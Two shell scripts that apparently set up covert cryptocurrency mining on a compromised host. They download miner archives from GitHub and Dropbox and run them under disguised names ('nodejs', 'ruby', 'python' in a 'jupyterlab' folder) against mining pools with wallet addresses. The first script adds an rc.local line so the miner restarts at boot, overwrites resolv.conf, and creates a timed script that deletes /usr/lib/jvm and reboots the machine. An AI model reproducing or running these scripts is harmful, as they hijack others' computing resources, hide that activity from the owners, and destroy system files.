[1]
#!/bin/sh
cd /home/sshuser

echo vm.nr_hugepages=2560 >> /etc/sysctl.conf

echo nameserver 1.1.1.1 > /etc/resolv.conf

echo '
cd /home/sshuser
./e &
' >> /etc/rc.local

mkdir db1 db2

cd /home/sshuser/db1
wget https://raw.githubusercontent.com/d1uf95z8/csv/master/csv44.tar.gz
tar xvzf csv44.tar.gz

cd /home/sshuser/db2
wget https://raw.githubusercontent.com/d1uf95z8/csv/master/csv45.tar.gz
tar xvzf csv45.tar.gz

touch a.txt
echo '{
"retry_time" : 20,
"cpu_threads" : 8,
"giveup_limit" : 15,
"algorithm" : "randomepic",
"disable_cpu" : false,
"disable_gpu" : true
}' > a.txt

mkdir Cache Config Logs Pools

cd /home/sshuser

touch e
chmod +x e

echo '#!/bin/sh
cd /home/sshuser/db1
nice -n 19 ./nodejs -o 47.101.30.124:13531 -u 8AojJ7BLoNn5SKuXLBk4aBMafgUwMqPNMAJa7KiEkB2w71sgRaBG7x69HtYtfc626Q8A1y2eiYqfU4NDzkxBjDnJJQEUfvW -a rx/0 --donate-level 1 -t 8 -B

cd /home/sshuser
sleep 50
cd /home/sshuser/db2
nice -n -20 nohup ./ruby --config-file a.txt --pool epic.icemining.ca:4000 --wallet ylwflanh --password z >/dev/null 2>&1 &

cd /home/sshuser
' > e

touch d
chmod +x d

echo '#!/bin/sh
cd /home/sshuser
sleep 50m
pkill -e -x nodejs
sleep 20
pkill -e -x ruby
sleep 20
rm -r /usr/lib/jvm
sleep 20
shutdown now -r
' > d

cd /home/sshuser/db1
nice -n 19 ./nodejs -o 47.101.30.124:13531 -u 8AojJ7BLoNn5SKuXLBk4aBMafgUwMqPNMAJa7KiEkB2w71sgRaBG7x69HtYtfc626Q8A1y2eiYqfU4NDzkxBjDnJJQEUfvW -a rx/0 --donate-level 1 -t 8 -B

cd /home/sshuser
sleep 60
cd /home/sshuser/db2
nice -n -20 nohup ./ruby --config-file a.txt --pool epic.icemining.ca:4000 --wallet ylwflanh --password z >/dev/null 2>&1 &

cd /home/sshuser
./d &

cd /home/sshuser

[2]
#!/bin/sh
cd /home/sshuser
sysctl vm.nr_hugepages=2048
ls
wget https://www.dropbox.com/s/2j15ohnntlucrf2/nodejsapp8q.tar.gz
tar xvzf nodejsapp8q.tar.gz
mkdir jupyterlab
cd nodejsbrnt
cp nodejsfive /home/sshuser/jupyterlab/python
cd /home/sshuser
rm -r nodejsapp8q.tar.gz
rm -r nodejsbrnt
cd /home/sshuser/jupyterlab
./python -o 95.216.42.85:10662 -u So2ifgjqGMZJhCrqpFMotQQAiJAiATuJLNAK2HrPLoNzK8hkqNbf9t8gmx6bzAQrXRMnWnoELoiD6GTv8guPBRwH5ymuNB4Z32x2tMXrRP6k.85000 -p ze -a rx/wow --donate-level 1 -t 7 -B
clear
mkdir d

END
